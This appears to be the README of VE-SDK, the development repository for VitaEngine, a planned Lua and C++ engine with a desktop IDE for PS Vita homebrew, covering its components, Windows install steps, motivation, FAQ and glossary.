<div style="font-family:nunito">

<p align="center">
<br>
<img src="./Assets/Logos/veSdkLogo.svg" alt="VitaEngine Icon" height="96">
<br>
<br>
</p>

---

<h3>What is VitaEngine?</h3>

<h4 align="left">
<b>VitaEngine</b> is an open source platform envisioned to make <b>PS Vita</b>
 game and application development more accessible, integrated and user-friendly, 
 reducing part of the complexity traditionally associated with the homebrew 
 ecosystem.
<br>
The long-term goal of VitaEngine is to provide a more direct creation workflow in 
<b>Lua</b>, powered by a native <b>C++</b> engine running on the console itself, 
alongside a dedicated <b>desktop IDE</b> designed around the development process.
<br>
<br>
</h4>

---

<h3>What is VE-SDK?</h3>

<h4 align="left">
<b>VE-SDK (VitaEngine SDK)</b> is the technical development repository for the 
VitaEngine platform itself.
<br>
<br>
It contains the structural foundation used to build, test and evolve the engine, 
including <b>source code</b>, <b>scripts</b>, <b>dependencies</b>, 
<b>supporting tools</b>, <b>technical documentation</b> and other experimental 
components required during development.
<br>
<br>
This repository <b>does not represent the final end-user distribution of 
VitaEngine</b>. Its current purpose is to serve as the development environment 
for the platform itself.
<br>
<br>
</h4>

---

<h3>Worth mentioning</h3>

<h4 align="left">
VitaEngine is an <b>independent, non-profit, open source project developed in 
parallel</b>, primarily as a long-term author-driven effort.
<br>
<br>
Because of that, <b>there is no fixed roadmap, guaranteed milestones or public 
completion date</b>.
<br>
<br>
Although it is still in an early stage as a user-facing product, this project 
<b>already has a real technical foundation under active development</b>, 
including an evolving architecture, tooling experiments, project structure and 
the gradual implementation of the components that will form the VitaEngine 
ecosystem.
<br>
<br>
</h4>

---

<h3>Who is this repository for?</h3>

<h4 align="left">
<b>VE-SDK</b> is primarily intended for:
<br>
<br>
<ul>
  <li><b>Contributors</b></li>
  <li><b>Early adopters</b></li>
  <li><b>Technically curious users</b></li>
  <li>People interested in studying VitaEngine’s architecture</li>
  <li>People who want to follow or test the platform’s technical evolution</li>
</ul>
<br>
If your goal is simply to <b>use VitaEngine directly to create projects</b>, 
the long-term plan is to provide a separate distribution that is more 
user-friendly and focused on end-user workflows.
<br>
<br>
</h4>

---

<h3>What does this repository contain?</h3>

<h4 align="left">
In general, VE-SDK may include components such as:
<br>
<br>
<ul>
  <li><b>IDE</b>: source code and desktop interface resources for VitaEngine</li>
  <li><b>Engine</b>: the native engine core and its internal components</li>
  <li><b>Scripts</b>: setup, build and maintenance automation</li>
  <li><b>Toolchains</b>: third-party toolchains required by the ecosystem</li>
  <li><b>Docs</b>: technical documentation and architecture notes</li>
  <li><b>Assets</b>: visual resources and internal files used by the ecosystem</li>
</ul>
<br>
The exact organization may evolve over time as the platform architecture matures.
<br>
<br>
</h4>

---

<h3>Platform overview</h3>

<h4 align="left">
In short, the VitaEngine proposal involves:
<br>
<br>
<ul>
  <li>A dedicated <b>desktop IDE</b> built around the development workflow</li>
  <li>A native <b>C++ engine</b> running on the PS Vita</li>
  <li>A <b>Lua API</b> exposed for creating games and applications</li>
  <li>A native <b>host/runtime component</b> responsible for executing projects 
  on the console</li>
  <li>A communication layer for <b>preview, testing and iteration on real 
  hardware</b></li>
  <li>Final packaging into <b>.VPK</b> for PS Vita distribution</li>
</ul>
<br>
During development, console integration may be handled through the <b>VitaEngine 
Companion</b>, a dedicated PS Vita application that acts as a bridge between real 
hardware and the VitaEngine IDE, enabling preview, testing and additional 
development-oriented functionality.
<br>
<br>
In future stages, part of this experience is expected to be presented in a more 
accessible end-user distribution of VitaEngine.
<br>
<br>
</h4>

---

<h3>VitaEngine Companion</h3>

<h4 align="left">
<b>VitaEngine Companion</b> is a <b>PS Vita application</b> focused on the 
platform’s development workflow.
<br>
<br>
Its role is to act as a bridge between the <b>VitaEngine IDE</b> and real 
hardware, enabling features such as:
<br>
<br>
<ul>
  <li><b>Preview</b> of games and applications in development</li>
  <li><b>Fast iteration</b> directly on the console</li>
  <li><b>Integration with the testing workflow</b> during development</li>
  <li>Potential <b>debug</b> and communication features in future stages</li>
</ul>
<br>
Although it is part of the VitaEngine ecosystem, the Companion <b>is not the 
engine itself</b>, but rather a specialized component designed specifically 
for development mode.
<br>
<br>
</h4>

---

<h3>Installing VE-SDK</h3>

<h4 align="left">
To make early testing and technical contribution easier, this repository provides 
an automated <b>VE-SDK installer</b> focused on preparing the development 
environment on <b>Windows 11</b>.
<br>
<br>
The installer may configure the structure required for platform development, 
including dependencies, supporting software, documentation and convenient 
shortcuts for quick access to the main tools.
<br>
<br>
</h4>

> **🛠️ At this stage, VE-SDK is primarily intended for VitaEngine development 
> itself, early testing and technical contribution — not for end-user 
> production use.**

> **⚠️ Warning: executing remote scripts can be highly unsafe. Only run files 
> from trusted sources and, whenever possible, verify the signature/hash before 
> executing them.**

> **✅ Install.zip file signature (SHA-256):  
> D600A528A1A6B118B1B4D76E8B611F3A315DF87D85F0CE629CC0D933E6C4DD80**

<h4 align="left">
<em>Installation file: 
<a href="https://github.com/ali90taz/VE-SDK/raw/staging/Install.zip">
Install.zip</a></em>
<br>
</h4>

<h4>How to install:</h4>

<h4 align="left">
1. Download <b>Install.zip</b>
<br>
2. Extract the contents
<br>
3. Run <b>Install.lnk</b>
<br>
4. Confirm the prompts
<br>
5. Wait for the automatic setup to complete
<br>
<br>
If you prefer a manual installation or want to understand exactly what the 
installer does, check:
<br>
<br>
<i>Scripts/Setup/<a href="https://github.com/ali90taz/VE-SDK/blob/staging/Scripts/Setup/Install-VE-SDK.ps1">Install-VE-SDK.ps1</a></i>
<br>
</h4>

---

<h3>A bit of history and motivation</h3>

<h4 align="left">
Why?
<br>
<br>
The PS Vita had a short life, despite being an extremely promising handheld.
Unfortunately, its official library did not receive as many titles as it could 
have. Fortunately, there is another side of the story: the homebrew community.
<br>
<br>
Every console has one, and the PS Vita is no exception. Thanks to the masterful 
efforts of incredibly talented people, we can enjoy unofficial games and 
applications that expand the potential of hardware that deserved much more.
<br>
<br>
But for some of us, simply enjoying it is not enough — we also want to 
participate, create and bring new ideas to life.
<br>
<br>
The problem is that developing for PS Vita is still far from simple. Even with 
all the excellent work already done by the community, getting a functional 
application running on the console can still require a long setup journey: a 
Linux environment, familiarity with C, CMake, Makefiles and a solid understanding 
of how the Vita SDK works. In the end, you still have to hope everything compiles without errors.
<br>
<br>
For beginners, that process can be intimidating, frustrating and may consume 
days — or even weeks — before something truly works.
<br>
<br>
There are excellent projects, such as 
<a href="https://github.com/Rinnegatamante/lpp-vita">Lua Player Plus Vita</a>, 
that already abstract a significant part of this complexity and deserve enormous 
respect for that. Even so, they do not offer exactly an “open and start” 
experience. They are powerful tools, but still largely geared toward more 
curious and advanced users.
<br>
<br>
That is exactly where VitaEngine aims to fit in: not to replace the work of the 
community, but to build a layer on top of it — more accessible, more integrated 
and more user-friendly — making PS Vita development more direct, more modern and 
more inspiring.
<br>
<br>
</h4>

---

<h3>Frequently Asked Questions</h3>

<h4 align="left">

<b>Q:</b> Which platforms will be supported?
<br>
<b>A:</b> VitaEngine is currently being developed with <b>modern Windows</b> as 
the primary target. In the future, the intention is to expand support to 
<b>Linux</b> and <b>macOS</b>.
<br>
<br>
<b>Q:</b> Which PS Vita models are expected to be supported by generated 
applications?
<br>
<b>A:</b> VitaEngine is intended to generate <b>.VPK</b> games and applications 
compatible with both <b>PS Vita Fat</b> and <b>PS Vita Slim</b> models. At the 
moment, there are no official plans for <b>PS TV</b> support.
<br>
<br>
<b>Q:</b> Will VitaEngine be a complete engine or just a layer on top of the 
Vita SDK?
<br>
<b>A:</b> The goal of VitaEngine is to go beyond being just a thin layer over 
the Vita SDK. The long-term vision is for it to become a development platform 
with its own workflow, high-level API and integrated experience, inspired by 
modern engines such as <b>Unreal Engine</b>, <b>Unity</b> and <b>GameMaker</b>, 
but designed exclusively for the <b>PS Vita</b>.
<br>
<br>
<b>Q:</b> Is this repository already the final recommended way to use VitaEngine?
<br>
<b>A:</b> No. This repository represents <b>VE-SDK</b>, meaning the technical 
foundation and development environment of the platform itself. The long-term goal 
is to provide a more user-friendly end-user distribution of VitaEngine separately.
<br>
<br>
</h4>

---

<h3>Glossary</h3>

<h4 align="left">

<b>VitaEngine Companion</b> : <i>A PS Vita application focused on the VitaEngine 
development workflow, used as a bridge between the IDE and real hardware for 
preview, testing and auxiliary development features.</i>
<br>

<b>VE</b> : <i>A semantic alias for VitaEngine, used as a shortened form in 
technical and organizational contexts.</i>
<br>

<b>VE-SDK</b> : <i>VitaEngine SDK. The technical foundation and development 
environment of the VitaEngine platform itself, intended for contributors, testing 
and engine evolution.</i>
<br>

<b>VEA</b> : <i>VitaEngine Application. Internal prefix used by applications 
created with VitaEngine.</i>
<br>

<b>VEP</b> : <i>VitaEngine Project. Project file extension used during development.</i>
<br>
<br>
</h4>

---

<h3>Credits</h3>

<h4 align="left">
This project uses a variety of third-party resources.  
For more information, please check the 
<a href="https://github.com/ali90taz/VitaEngine/blob/staging/CREDITS.md">
<i>CREDITS.md</i></a> 
file in this repository.
<br>
<br>
</h4>

---

<h3>Disclaimer</h3>

<h4 align="left">
<ul>
<li>VitaEngine <b>is not affiliated with, endorsed by, or licensed by Sony
Interactive Entertainment</b>.</li>
<li><b>PS Vita</b> is a trademark of Sony Interactive Entertainment.</li>
<li>Third-party names, assets and technologies belong to their respective owners.</li>
</ul>
<br>
</h4>

---

</div>
